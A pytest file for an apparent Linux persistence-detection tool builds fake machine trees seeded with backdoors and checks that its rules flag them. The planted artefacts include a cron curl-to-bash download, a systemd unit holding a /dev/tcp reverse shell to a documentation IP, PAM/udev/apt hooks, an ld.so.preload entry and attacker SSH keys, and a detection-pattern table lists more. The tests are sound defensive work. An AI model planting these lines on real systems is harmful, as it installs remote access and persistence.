"""The persistence check (A.1): one closed location table read two ways (a POSIX
sh+awk script over SSH, a stdlib walk as root through the sub-agent) that print
the SAME records; one parser; judging on Kratos against the first look; findings
that carry stable identities and ATT&CK v19 labels. Reads use fake machine trees
under tmp_path -- no real SSH -- and run the real generated script under every
awk available (mawk/gawk/BusyBox)."""
from __future__ import annotations

import os
import shutil
import subprocess
from pathlib import Path

import pytest

from kratos.adapters import persistence as P
from kratos.persist import baseline as B
from kratos.persist import judge as J
from kratos.persist import record, shapes
from tests._logsources_util import awks

AWKS = awks()
pytestmark = pytest.mark.skipif(not AWKS, reason="no awk available")

# ---------------------------------------------------------------- fake machine trees
_PASSWD = "root:x:0:0:root:/root:/bin/bash\nubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash\n" \
          "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
_OSREL = {"debian": "ID=ubuntu\nID_LIKE=debian\n", "rhel": "ID=rocky\nID_LIKE=\"rhel fedora\"\n",
          "alpine": "ID=alpine\n"}


def _w(path: Path, text: str, mode: int = 0o644) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    path.chmod(mode)


def make_machine(tmp_path: Path, family: str = "debian", *, planted: bool = False,
                 owned: dict[str, str] | None = None, name: str = "root") -> Path:
    """A minimal fake machine. `owned` maps a path to the dpkg/rpm/apk package that
    owns it (written into the package database the script/walk read)."""
    r = tmp_path / name
    (r / "etc").mkdir(parents=True, exist_ok=True)
    _w(r / "etc/os-release", _OSREL[family])
    _w(r / "etc/passwd", _PASSWD)
    (r / "proc").mkdir(exist_ok=True)
    _w(r / "proc/mounts", f"/dev/root / ext4 rw 0 0\n")
    (r / "root/.ssh").mkdir(parents=True, exist_ok=True)
    (r / "home/ubuntu/.ssh").mkdir(parents=True, exist_ok=True)
    _w(r / "home/ubuntu/.bashrc", "export PATH=$PATH\n")
    # a clean, package-owned cron file and a clean unit
    _w(r / "etc/cron.d/clean", "17 * * * * root cd / && run-parts /etc/cron.hourly\n")
    _w(r / "usr/lib/systemd/system/ssh.service", "[Service]\nExecStart=/usr/sbin/sshd -D\n")
    if planted:
        _w(r / "etc/cron.d/apache-update", "* * * * * root curl -s http://198.51.100.9/x | bash\n")
        _w(r / "etc/systemd/system/network-helper.service",
           "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.9/4444 0>&1'\n")
        (r / "etc/systemd/system/multi-user.target.wants").mkdir(parents=True, exist_ok=True)
        os.symlink("../network-helper.service",
                   r / "etc/systemd/system/multi-user.target.wants/network-helper.service")
        _w(r / "etc/ld.so.preload", "/usr/lib/evil.so\n")
        (r / "usr/local/bin").mkdir(parents=True, exist_ok=True)
        shutil.copy("/bin/true", r / "usr/local/bin/.sysbash")
        (r / "usr/local/bin/.sysbash").chmod(0o4755)
        _w(r / "etc/profile.d/00-telemetry.sh", "nohup /tmp/.hidden/backdoor &\n")
        _w(r / "etc/pam.d/sshd", "auth optional pam_exec.so /usr/local/sbin/.pamhook.sh\n")
        _w(r / "etc/udev/rules.d/99-persist.rules", 'ACTION=="add", RUN+="/bin/sh -c curl"\n')
        _w(r / "etc/apt/apt.conf.d/99local-hook", 'APT::Update::Pre-Invoke {"/var/tmp/.apt/hook.sh";};\n')
        _w(r / "root/.ssh/authorized_keys",
           'command="/bin/backdoor" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVILkeyEVILkeyEVILkeyEVILkeyEVILkey00 root@x\n')
        _w(r / "home/ubuntu/.ssh/authorized_keys",
           "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbackdoor new@attacker\n")
    _write_pkgdb(r, family, owned or {})
    return r


def _write_pkgdb(r: Path, family: str, owned: dict[str, str]) -> None:
    if family == "debian":
        d = r / "var/lib/dpkg/info"
        d.mkdir(parents=True, exist_ok=True)
        by_pkg: dict[str, list[str]] = {}
        for path, pkg in owned.items():
            by_pkg.setdefault(pkg, []).append(path)
        for pkg, paths in by_pkg.items():
            (d / f"{pkg}.list").write_text("\n".join(paths) + "\n")
    elif family == "alpine":
        d = r / "lib/apk/db"
        d.mkdir(parents=True, exist_ok=True)
        lines = []
        for path, pkg in owned.items():
            folder, _, fname = path.rpartition("/")
            lines += [f"P:{pkg}", f"F:{folder.lstrip('/')}", f"R:{fname}"]
        (d / "installed").write_text("\n".join(lines) + "\n")
    # rhel ownership comes from `rpm` (a run() callback), handled in the agent-path test


# ---------------------------------------------------------------- run both transports
def _bindir(tmp_path: Path, awk: str) -> Path:
    b = tmp_path / f"bin_{awk}"
    if b.exists():
        return b
    b.mkdir()
    tools = ("sh", "sed", "tr", "cat", "readlink", "head", "rm", "stat", "grep", "sha256sum", "cut",
             "base64", "tail", "sort", "wc", "echo", "printf", "mkdir", "true", "find", "id", "uname",
             "xargs", "date", "env", "timeout", "awk")
    for tool in tools:
        if tool == "awk":
            os.symlink(os.environ.get("KRATOS_TEST_BUSYBOX") or shutil.which("busybox") if awk == "busybox"
                       else shutil.which(awk), b / "awk")
        else:
            src = shutil.which(tool)
            if src:
                os.symlink(src, b / tool)
    return b


def run_ssh(tmp_path: Path, root: Path, awk: str = "gawk", verify: bool = False) -> dict:
    b = _bindir(tmp_path, awk)
    script = P.build_script(root=str(root), verify=verify)
    e = {"PATH": str(b), "LC_ALL": "C"}
    r = subprocess.run([str(b / "sh"), "-s"], input=script, capture_output=True, text=True, env=e, timeout=90)
    assert "syntax error" not in r.stderr, r.stderr
    return P.parse_output(r.stdout, root=str(root))


def run_agent(root: Path, verify: bool = False, is_credential=None, deadline=None) -> dict:
    def run(argv, timeout, cap):
        res = subprocess.run(argv, capture_output=True, text=True, timeout=timeout)
        return {"stdout": res.stdout, "stderr": res.stderr, "returncode": res.returncode}
    out = P.inventory_output(root=str(root), verify=verify, run=run,
                             is_credential=is_credential or P_is_cred, deadline=deadline)
    return P.parse_output(out["stdout"], root=str(root))


def P_is_cred(path: str) -> bool:
    from kratos.subagent.reads import is_credential_path
    return is_credential_path(path)


# ==================================================================== parser / transports
@pytest.mark.parametrize("awk", AWKS)
def test_ssh_reads_every_area_on_a_planted_machine(tmp_path, awk):
    owned = {"/etc/cron.d/clean": "cron", "/usr/lib/systemd/system/ssh.service": "openssh-server"}
    r = make_machine(tmp_path, "debian", planted=True, owned=owned)
    inv = run_ssh(tmp_path, r, awk)
    assert inv["family"] == "debian" and inv["complete"]
    areas = {it.get("area") for it in inv["items"].values()}
    for area in ("cron", "systemd", "suid", "preload", "shell", "pam", "udev", "pkg_hooks"):
        assert area in areas, (area, sorted(areas))
    # the SUID backdoor is found and marked
    assert any(it.get("suid_bits") and p.endswith(".sysbash") for p, it in inv["items"].items())
    # keys parsed to fingerprints, not blobs
    users = {k["user"] for k in inv["keys"]}
    assert "ubuntu" in users
    assert all(k["fingerprint"] or k["type"] == "unparsed" for k in inv["keys"])


@pytest.mark.parametrize("awk", AWKS)
def test_ssh_and_agent_print_the_same_records(tmp_path, awk):
    owned = {"/etc/cron.d/clean": "cron", "/usr/lib/systemd/system/ssh.service": "openssh-server"}
    r = make_machine(tmp_path, "debian", planted=True, owned=owned)
    ssh = run_ssh(tmp_path, r, awk)
    agent = run_agent(r)
    assert set(ssh["items"]) == set(agent["items"]), (
        sorted(set(ssh["items"]) - set(agent["items"])), sorted(set(agent["items"]) - set(ssh["items"])))
    ssh_keys = sorted((k["user"], k["fingerprint"], k["options"]) for k in ssh["keys"])
    agent_keys = sorted((k["user"], k["fingerprint"], k["options"]) for k in agent["keys"])
    assert ssh_keys == agent_keys
    for p in ssh["items"]:
        assert ssh["items"][p].get("sha256") == agent["items"][p].get("sha256"), p


@pytest.mark.parametrize("awk", AWKS)
def test_awk_and_python_twin_select_the_same_lines(tmp_path, awk):
    samples = {
        "cron": b"# a comment\n* * * * * root /tmp/x.sh\n\nMAILTO=root\n",
        "shell": b"export PATH=/usr/bin\nif [ x ]; then\nnohup /tmp/.e &\nfi\nalias ll='ls -l'\n",
        "unit": b"[Service]\nExecStart=/bin/sh -c evil\nType=simple\nEnvironment=LD_PRELOAD=/x\n",
        "pam": b"auth required pam_unix.so\nauth optional pam_exec.so /opt/hook\n",
        "udev": b'ACTION=="add", RUN+="/bin/x"\nKERNEL=="sda"\n',
        "apt": b'APT::Update::Pre-Invoke {"/x";};\nDir "/";\n',
        "desktop": b"[Desktop Entry]\nExec=/tmp/x\nName=X\n",
        "modprobe": b"install evil /bin/sh\nblacklist foo\n",
        "preload": b"/usr/lib/a.so\n/usr/lib/b.so\n",
        "conf": b"/opt/lib\n# comment\n",
    }
    b = _bindir(tmp_path, awk)
    for mode, data in samples.items():
        f = tmp_path / f"s_{mode}"
        f.write_bytes(data)
        py = [r for r in P.extract_lines(mode, str(f), data) if not r.startswith("P\t")]
        cmd = [str(b / "awk"), "-v", f"mode={mode}", "-v", f"maxl={P.MAX_LINES_PER_FILE}",
               "-v", f"maxc={P.MAX_LINE_CHARS}", P.AWK, str(f)]
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        aw = sorted(ln for ln in out.stdout.split("\n") if ln.startswith(("L\t", "LT\t")))
        assert sorted(py) == aw, (mode, awk, py, aw)


def test_line_and_file_caps_truncate_and_flag(tmp_path):
    r = make_machine(tmp_path, "debian")
    big = "\n".join(f"* * * * * root /tmp/cmd{i}" for i in range(80)) + "\n"
    _w(r / "etc/cron.d/big", big)
    long_line = "* * * * * root " + "A" * 500 + "\n"
    _w(r / "etc/cron.d/longline", long_line)
    inv = run_agent(r)
    assert inv["items"]["/etc/cron.d/big"]["lines_total"] == 80
    assert len(inv["items"]["/etc/cron.d/big"]["lines"]) == P.MAX_LINES_PER_FILE
    shown = inv["items"]["/etc/cron.d/longline"]["lines"][0]["text"]
    assert len(shown) <= P.MAX_LINE_CHARS


def test_directory_entry_cap_is_reported(tmp_path):
    r = make_machine(tmp_path, "debian")
    for i in range(P.MAX_FILES_PER_LOCATION + 5):
        _w(r / f"etc/cron.d/j{i:04d}", "* * * * * root /bin/true\n")
    inv = run_agent(r)
    assert any(t["area"] == "cron" and t["count"] >= P.MAX_FILES_PER_LOCATION + 5 for t in inv["truncated"])


# ==================================================================== safety
def test_credential_files_are_never_read_but_authorized_keys_is(tmp_path):
    r = make_machine(tmp_path, "debian")
    # a private key dropped where the walk would see it (home .ssh), plus shadow
    _w(r / "etc/shadow", "root:$6$secret:0:0:::\n", 0o600)
    _w(r / "home/ubuntu/.ssh/id_ed25519", "-----BEGIN " + "OPENSSH PRIVATE KEY-----\nSECRET\n")
    _w(r / "home/ubuntu/.ssh/authorized_keys",
       "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAk me@host\n")
    inv = run_agent(r)
    # shadow and the private key are never listed as content (not in our table anyway),
    # and if ever reached, _read_capped refuses them: no 'lines'/'sha256' leak
    for bad in ("/etc/shadow", "/home/ubuntu/.ssh/id_ed25519"):
        it = inv["items"].get(bad)
        assert it is None or (not it.get("lines") and not it.get("sha256"))
    # the authorized_keys file is read, but only to a fingerprint -- the blob never appears
    assert any(k["path"] == "/home/ubuntu/.ssh/authorized_keys" and k["fingerprint"] for k in inv["keys"])
    import json as _j
    assert "AAAAC3NzaC1lZDI1NTE5" not in _j.dumps(inv)


def test_a_symlinked_directory_is_reported_as_an_alias_not_walked(tmp_path):
    r = make_machine(tmp_path, "debian")
    (r / "etc/cron.real").mkdir()
    _w(r / "etc/cron.real/payload", "* * * * * root /tmp/x\n")
    # replace one listed cron dir with a symlink to the real one
    shutil.rmtree(r / "etc/cron.daily", ignore_errors=True)
    os.symlink("cron.real", r / "etc/cron.daily")
    inv = run_agent(r)
    assert any(a["path"] == "/etc/cron.daily" for a in inv["aliases"])


def test_excerpt_lines_are_masked_before_they_leave(tmp_path):
    r = make_machine(tmp_path, "debian")
    _w(r / "etc/cron.d/leak", "* * * * * root /usr/bin/app --password hunter2 --token abcdef\n")
    inv = run_agent(r)
    j = J.judge(inv, None, areas_known=P.AREAS)
    blob = repr([s.as_dict() for s in j.signals])
    assert "hunter2" not in blob and "abcdef" not in blob


# ==================================================================== ownership
def test_owned_and_unmodified_is_not_reported_new(tmp_path):
    owned = {"/etc/cron.d/clean": "cron"}
    r = make_machine(tmp_path, "debian", owned=owned)
    inv = run_agent(r)
    assert inv["items"]["/etc/cron.d/clean"].get("package") == "cron"
    j = J.judge(inv, _first_look(tmp_path, r), areas_known=P.AREAS)
    assert "/etc/cron.d/clean" not in J.Judgement(inv, None, areas_known=P.AREAS).classify()


def test_unowned_item_is_classified(tmp_path):
    r = make_machine(tmp_path, "debian")  # nothing owned
    _w(r / "etc/cron.d/mystery", "* * * * * root /opt/thing\n")
    inv = run_agent(r)
    cls = J.Judgement(inv, None, areas_known=P.AREAS).classify()
    assert "/etc/cron.d/mystery" in cls


def test_ownership_lookup_failure_is_a_gap_not_all_unowned(tmp_path):
    r = make_machine(tmp_path, "debian")
    shutil.rmtree(r / "var/lib/dpkg/info")        # no package database at all
    _w(r / "etc/cron.d/x", "* * * * * root /opt/y\n")
    inv = run_agent(r)
    assert inv["ownership"]["error"]
    jg = J.Judgement(inv, None, areas_known=P.AREAS)
    jg.run()
    assert jg.classify() == {}                    # cannot call anything unowned
    assert any("package database" in g for g in jg.gaps)


def _first_look(tmp_path, r) -> B.Baseline:
    inv = run_agent(r)
    return B.save_first_look(tmp_path / "dd", "m", inv, areas=P.AREAS)


# ==================================================================== judge: each rule
def _judge_planted(tmp_path, family="debian"):
    owned = {"/etc/cron.d/clean": "cron", "/usr/lib/systemd/system/ssh.service": "openssh-server"}
    clean = make_machine(tmp_path, family, owned=owned, name="clean")
    base = B.save_first_look(tmp_path / "dd", "m", run_agent(clean), areas=P.AREAS)
    planted = make_machine(tmp_path, family, planted=True, owned=owned, name="planted")
    inv = run_agent(planted)
    return J.judge(inv, base, areas_known=P.AREAS), inv


def _rule(j, rid):
    return [s for s in j.signals if s.rule == rid]


def test_persist001_new_unowned_items_with_backdoor_shape(tmp_path):
    j, _ = _judge_planted(tmp_path)
    s = _rule(j, "PERSIST-001")
    assert s and s[0].severity == "high"   # reverse shell / curl|sh present -> strong -> high
    paths = " ".join(s[0].evidence)
    assert "/etc/cron.d/apache-update" in paths and "network-helper.service" in paths
    assert all(a["technique_id"] for a in s[0].attack)


def test_persist003_unowned_suid(tmp_path):
    j, _ = _judge_planted(tmp_path)
    s = _rule(j, "PERSIST-003")
    assert s and s[0].severity == "high"
    assert ".sysbash" in " ".join(s[0].evidence)
    assert s[0].attack[0]["technique_id"] == "T1548.001"


def test_persist004_preload(tmp_path):
    j, _ = _judge_planted(tmp_path)
    s = _rule(j, "PERSIST-004")
    assert s and s[0].severity == "high"
    assert "/etc/ld.so.preload" in " ".join(s[0].evidence)


def test_persist008_pam(tmp_path):
    j, _ = _judge_planted(tmp_path)
    s = _rule(j, "PERSIST-008")
    assert s and s[0].severity == "high" and ".pamhook.sh" in " ".join(s[0].evidence)


def test_persist006_new_key(tmp_path):
    j, _ = _judge_planted(tmp_path)
    s = _rule(j, "PERSIST-006")
    assert any("new SSH key" in sig.title and sig.severity == "medium" for sig in s)
    # both planted keys (root command= and ubuntu) are new -> named in the finding
    ev = " ".join(e for sig in s for e in sig.evidence)
    assert "new@attacker" in ev or "root@x" in ev


def test_persist006_command_option_on_an_existing_key(tmp_path):
    # a key already in the baseline, with command=, is a low 'options' signal, not 'new'
    clean = make_machine(tmp_path, "debian", name="clean")
    _w(clean / "root/.ssh/authorized_keys",
       'command="/usr/bin/backup" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICLEANkeyCLEANkeyCLEANkeyCLEANkeyCLEAN00 root@h\n')
    base = B.save_first_look(tmp_path / "dd", "m", run_agent(clean), areas=P.AREAS)
    again = make_machine(tmp_path, "debian", name="again")
    _w(again / "root/.ssh/authorized_keys",
       'command="/usr/bin/backup" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICLEANkeyCLEANkeyCLEANkeyCLEANkeyCLEAN00 root@h\n')
    j = J.judge(run_agent(again), base, areas_known=P.AREAS)
    s = _rule(j, "PERSIST-006")
    assert any("options worth checking" in sig.title and sig.severity == "low" for sig in s)
    assert not any("new SSH key" in sig.title for sig in s)


def test_persist005_unowned_kernel_module(tmp_path):
    r = make_machine(tmp_path, "debian")
    # fake /proc/modules with one module + a taint, and a modules.dep pointing it somewhere
    rel = os.uname().release
    _w(r / "proc/modules", "evilmod 16384 0 - Live 0x0000000000000000 (OE)\n")
    _w(r / "proc/sys/kernel/tainted", "4096\n")
    dep = r / f"lib/modules/{rel}/modules.dep"
    _w(dep, "kernel/evil/evilmod.ko:\n")
    _w(r / f"lib/modules/{rel}/evil/evilmod.ko", "ELF")
    # make the detector believe it is not a container
    inv = run_agent(r)
    if inv.get("container") not in (None, "none"):
        pytest.skip("container detector tripped in this sandbox")
    j = J.judge(inv, None, areas_known=P.AREAS)
    s = _rule(j, "PERSIST-005")
    assert s and s[0].severity == "medium"
    assert "evilmod" in " ".join(s[0].evidence)
    assert s[0].attack[0]["technique_id"] == "T1547.006"


def test_persist007_package_file_changed(tmp_path):
    r = make_machine(tmp_path, "debian", owned={"/etc/cron.d/clean": "cron"})
    verify = {"changed": {"/etc/cron.d/clean": {"flags": "..5......", "config": False, "content_changed": True}},
              "done": True, "tool": "dpkg", "error": None}
    inv = run_agent(r)
    inv["verify"] = verify
    j = J.judge(inv, None, areas_known=P.AREAS)
    s = _rule(j, "PERSIST-007")
    assert s and s[0].severity == "high" and "/etc/cron.d/clean" in " ".join(s[0].evidence)


def test_persist002_shape_without_newness(tmp_path):
    r = make_machine(tmp_path, "debian", owned={"/etc/cron.d/clean": "cron"})
    # an owned file with a worrying line still gets a 'worth a look' (low), never higher
    _w(r / "etc/cron.d/clean", "17 * * * * root /tmp/.x/run\n")
    inv = run_agent(r)
    j = J.judge(inv, None, areas_known=P.AREAS)
    s = _rule(j, "PERSIST-002")
    assert s and s[0].severity == "low"


def test_shapes_table_positive_and_negative():
    positive = {
        "runs-from-temp-dir": "* * * * * root /tmp/x.sh",
        "decodes-and-runs": "echo aGk= | base64 -d | bash",
        "downloads-and-runs": "curl -s http://x/y | sh",
        "network-shell": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        "loads-a-library-everywhere": "LD_PRELOAD=/lib/evil.so",
        "makes-itself-undeletable": "chattr +i /etc/cron.d/x",
    }
    for name, line in positive.items():
        assert name in [s.name for s in shapes.match(line)], (name, line)
    for benign in ("[ -x /usr/bin/lesspipe ] && eval \"$(lesspipe)\"", 'PATH="/usr/local/sbin:/usr/bin"',
                   "ExecStart=/lib/systemd/systemd-networkd", "17 * * * * root cd / && run-parts /etc/cron.hourly"):
        assert shapes.match(benign) == [], benign


# ==================================================================== identity / baseline
def test_changed_cron_line_is_a_new_entity(tmp_path):
    clean = make_machine(tmp_path, "debian", name="clean")
    _w(clean / "etc/cron.d/job", "* * * * * root /opt/a\n")
    base = B.save_first_look(tmp_path / "dd", "m", run_agent(clean), areas=P.AREAS)
    # unchanged -> not new
    again = make_machine(tmp_path, "debian", name="again")
    _w(again / "etc/cron.d/job", "* * * * * root /opt/a\n")
    j1 = J.judge(run_agent(again), base, areas_known=P.AREAS)
    assert not _rule(j1, "PERSIST-001")
    # changed -> new entity (path#newhash), reopens
    changed = make_machine(tmp_path, "debian", name="changed")
    _w(changed / "etc/cron.d/job", "* * * * * root /opt/b-different\n")
    j2 = J.judge(run_agent(changed), base, areas_known=P.AREAS)
    s = _rule(j2, "PERSIST-001")
    assert s and any("/etc/cron.d/job#" in e for e in s[0].entities)


def test_entity_of_tracks_content():
    a = J.entity_of("/etc/cron.d/x", {"sha256": "a" * 64})
    b = J.entity_of("/etc/cron.d/x", {"sha256": "b" * 64})
    assert a != b and a.startswith("/etc/cron.d/x#")


def test_a_new_area_does_not_flood_the_findings(tmp_path):
    # a baseline that never covered 'udev' must not make every udev file 'new'
    clean = make_machine(tmp_path, "debian", name="clean")
    base = B.save_first_look(tmp_path / "dd", "m", run_agent(clean), areas=("cron", "systemd"))
    later = make_machine(tmp_path, "debian", name="later")
    _w(later / "etc/udev/rules.d/60-default.rules", 'ACTION=="add", RUN+="/sbin/modprobe x"\n')
    j = J.judge(run_agent(later), base, areas_known=P.AREAS)
    # udev items are a first look, not PERSIST-001 'new'
    s = _rule(j, "PERSIST-001")
    assert not any("udev" in e for sig in s for e in sig.evidence)
    assert "udev" in j.new_areas
    assert any("first look at" in g and "udev" in g for g in j.gaps)


# ==================================================================== gaps / coverage
def test_root_only_location_is_a_coverage_gap_with_the_agent_fix(tmp_path):
    r = make_machine(tmp_path, "debian")
    (r / "root").chmod(0o000)
    os.chmod(r / "var/lib/dpkg/info", 0o755)
    # run the SSH script as this (non-root) user -- /root is unreadable
    try:
        inv = run_ssh(tmp_path, r)
    finally:
        (r / "root").chmod(0o755)
    assert any(g["path"] == "/root" for g in inv["gaps"])
    j = J.judge(inv, None, areas_known=P.AREAS)
    gap_text = " ".join(j.gaps)
    assert "/root" in gap_text and "sub-agent" in gap_text


def test_container_skips_the_kernel_check_and_says_so(tmp_path):
    r = make_machine(tmp_path, "debian")
    _w(r / "run/.containerenv", "")
    inv = run_agent(r)
    assert inv["container"] != "none"
    j = J.judge(inv, None, areas_known=P.AREAS)
    assert any("container" in g for g in j.gaps)
    assert not _rule(j, "PERSIST-005")


# ==================================================================== budget
def test_a_tight_deadline_returns_a_partial_inventory_not_a_hang(tmp_path):
    import time
    r = make_machine(tmp_path, "debian", planted=True)
    out = P.inventory_output(root=str(r), run=None, deadline=time.monotonic() - 1)
    inv = P.parse_output(out["stdout"], root=str(r))
    assert not inv["complete"]      # END never printed past the deadline
    j = J.judge(inv, None, areas_known=P.AREAS)
    assert any("did not finish" in g or "partial" in g for g in j.gaps)


# ==================================================================== record / snapshot
def test_record_saves_a_snapshot_the_engine_reads(tmp_path):
    r = make_machine(tmp_path, "debian", planted=True)
    dd = tmp_path / "data"
    first = record.run(dd, "10.0.0.9", reader=lambda v: P.parse_output(
        P.inventory_output(root=str(r), run=_subrun)["stdout"], root=str(r)))
    assert first["status"] == "ok" and first["baseline"]["first_look"]
    assert Path(first["file"]).exists()
    from kratos.adapters.findings_engine import find_latest_inputs
    found = find_latest_inputs(dd, "10.0.0.9")
    assert found["persistence"] is not None


def _subrun(argv, timeout, cap):
    res = subprocess.run(argv, capture_output=True, text=True, timeout=timeout)
    return {"stdout": res.stdout, "stderr": res.stderr, "returncode": res.returncode}


def test_a_failed_read_saves_nothing_and_keeps_the_baseline(tmp_path):
    from kratos.adapters.ssh_remote import SSHResult
    dd = tmp_path / "data"
    bad = SSHResult(ok=False, stdout="", stderr="connection refused", returncode=255, via="ssh")
    out = record.run(dd, "10.0.0.9", reader=lambda v: bad)
    assert out["status"] == "error"
    assert not (dd / "persistence").exists()
    assert B.load(dd, "10.0.0.9") is None


# ==================================================================== engine + lifecycle + guard
def test_engine_builds_persist_findings_from_a_snapshot(tmp_path):
    from kratos.adapters import findings_engine as FE
    r = make_machine(tmp_path, "debian", planted=True, name="planted")
    clean = make_machine(tmp_path, "debian", name="clean")
    base = B.save_first_look(tmp_path / "dd", "10.0.0.5", run_agent(clean), areas=P.AREAS)
    doc = record.run(tmp_path / "dd", "10.0.0.5", reader=lambda v: P.parse_output(
        P.inventory_output(root=str(r), run=_subrun)["stdout"], root=str(r)))
    findings = FE._persistence_findings(doc)
    ids = {f.id for f in findings}
    assert {"PERSIST-001", "PERSIST-003", "PERSIST-004", "PERSIST-008"} <= ids
    highs = [f for f in findings if f.severity == "high"]
    assert highs and all(f.attack for f in highs if f.id != "PERSIST-001" or f.attack)


def test_persist_finding_carries_a_stable_entity_that_reopens(tmp_path):
    from kratos.adapters import findings_engine as FE
    r = make_machine(tmp_path, "debian", name="m")
    _w(r / "etc/cron.d/x", "* * * * * root /opt/a\n")
    base = B.save_first_look(tmp_path / "dd", "10.0.0.5", run_agent(r), areas=P.AREAS)
    r2 = make_machine(tmp_path, "debian", name="m2")
    _w(r2 / "etc/cron.d/x", "* * * * * root /opt/BBBB\n")
    doc = record.run(tmp_path / "dd", "10.0.0.5", reader=lambda v: run_agent(r2))
    s1 = [f for f in FE._persistence_findings(doc) if f.id == "PERSIST-001"]
    assert s1 and any("/etc/cron.d/x#" in e for e in s1[0].entities)


LOW_SHAPE_DOC = {
    "target": "10.0.0.5", "checked_at": "2026-10-14T00:00:00+00:00", "via": "ssh", "reader_uid": 1000,
    "coverage_gaps": [], "signals": [
        {"rule": "PERSIST-001", "severity": "high", "title": "a backdoor-shaped cron job appeared",
         "evidence": ["  /etc/cron.d/x (cron jobs, added)"], "recommendation": ["check it"],
         "entities": ["/etc/cron.d/x#abc"], "attack": [dict(__import__("kratos.logsources.attack", fromlist=["CRON"]).CRON)]}]}


def test_guard3_rejects_a_clean_verdict_over_a_high_persistence_finding(tmp_path, monkeypatch):
    from kratos.agent import loop as agent_loop
    from kratos.agent.tools import TOOL_REGISTRY
    from kratos import kratos_config
    from tests.test_agent_loop_guards import ScriptedChat, _final_json, _tool_json

    finding = {"id": "PERSIST-001", "title": "a backdoor-shaped cron job appeared", "severity": "high",
               "evidence": ["/etc/cron.d/x"], "recommendation": ["check"], "entities": ["/etc/cron.d/x#abc"]}

    def correlate(**kwargs):
        return {"findings_json_file": "f.json", "findings_md_file": "f.md", "inputs_used": {}, "missing_inputs": [],
                "input_errors": {}, "staleness_warning": None, "findings": [finding], "count": 1}
    monkeypatch.setattr(TOOL_REGISTRY["correlate_findings"], "handler", correlate)
    kratos_config.set_active_target("10.136.28.168")
    answer = "No persistence found -- the system looks clean."
    chat = ScriptedChat([_tool_json("correlate_findings"), _final_json(answer), _final_json(answer), _final_json(answer)])
    monkeypatch.setattr(agent_loop, "agent_chat", chat)
    result = agent_loop.run_agent("is there any persistence on this box?", tmp_path, max_iters=10)
    assert any("dismissive_verdict_contradiction" in s.get("violations", [])
               for s in result["transcript"] if s.get("status") == "final_answer_rejected")


def test_an_incomplete_read_cannot_close_a_persist_finding(tmp_path, monkeypatch):
    """A persistence read that did not finish (or could not read the package db)
    must leave PERSIST-001 open, not mark it mitigated, on the next run."""
    from kratos.adapters import findings_engine as FE
    from kratos.lifecycle import coverage as lc_cov
    import kratos.run_context as rc

    captured = {}
    orig = lc_cov.for_report

    def spy(inputs, *, target, run, incomplete=frozenset(), **kw):
        captured["incomplete"] = set(incomplete)
        return orig(inputs, target=target, run=run, incomplete=incomplete, **kw)
    monkeypatch.setattr(lc_cov, "for_report", spy)

    ok_doc = {"complete": True, "ownership": {"source": "dpkg", "error": None}}
    bad_doc = {"complete": False, "ownership": {"source": "dpkg", "error": None}}
    no_owner = {"complete": True, "ownership": {"source": None, "error": "unreadable"}}
    with rc.run_scope("cli", target="10.0.0.5"):
        for doc, should_mark in ((ok_doc, False), (bad_doc, True), (no_owner, True)):
            captured.clear()
            FE._apply_lifecycle([], data_dir=tmp_path, target="10.0.0.5",
                                inputs={"persistence": None}, auth_stats=None, patterns_stats=None,
                                snapshots={"persistence": doc})
            assert ("persistence" in captured["incomplete"]) is should_mark, doc


# ==================================================================== collection check
def test_persistence_checks_are_registered_quick_and_slow():
    from kratos.collect import registry
    import kratos.collect.checks  # noqa: F401 -- registers the built-ins incl. persistence
    names = {c.name: c for c in registry.checks()}
    assert names["persistence"].cost == "quick" and names["persistence"].inputs == ("persistence",)
    assert names["persistence_verify"].cost == "slow"
    assert names["persistence"].transports == frozenset({"ssh", "agent"})


def test_persistence_check_runs_through_the_collection_layer(tmp_path, monkeypatch):
    from kratos.collect import registry
    from kratos.collect.registry import CheckContext
    import kratos.persist.check as pc

    r = make_machine(tmp_path, "debian", planted=True)
    real_run = record.run
    def fake_run(data_dir, target, *, verify=False, **kw):
        return real_run(data_dir, target, verify=verify,
                        reader=lambda v: P.parse_output(P.inventory_output(root=str(r), run=_subrun)["stdout"], root=str(r)))
    monkeypatch.setattr(pc.record, "run", fake_run)
    check = registry.get("persistence")
    ctx = CheckContext(target="10.0.0.5", target_key="10.0.0.5", data_dir=tmp_path, transport="ssh",
                       dispatch=lambda *a, **k: {}, deadline=9e18, now=0.0)
    res = check.run(ctx)
    assert res.status in ("ok", "partial")
    assert "place(s) that can start programs" in res.summary


def test_slow_verify_check_respects_the_off_switch(tmp_path, monkeypatch):
    from kratos import settings_store
    from kratos.collect import registry
    from kratos.collect.registry import CheckContext
    import kratos.persist.check as pc

    settings_store.set(pc.VERIFY_PACKAGES, False, data_dir=tmp_path, actor="test")
    called = {"n": 0}
    monkeypatch.setattr(pc, "_run", lambda ctx, *, verify: called.__setitem__("n", called["n"] + 1))
    ctx = CheckContext(target="10.0.0.5", target_key="10.0.0.5", data_dir=tmp_path, transport="ssh",
                       dispatch=lambda *a, **k: {}, deadline=9e18, now=0.0)
    res = registry.get("persistence_verify").run(ctx)
    assert res.status == "skipped" and called["n"] == 0
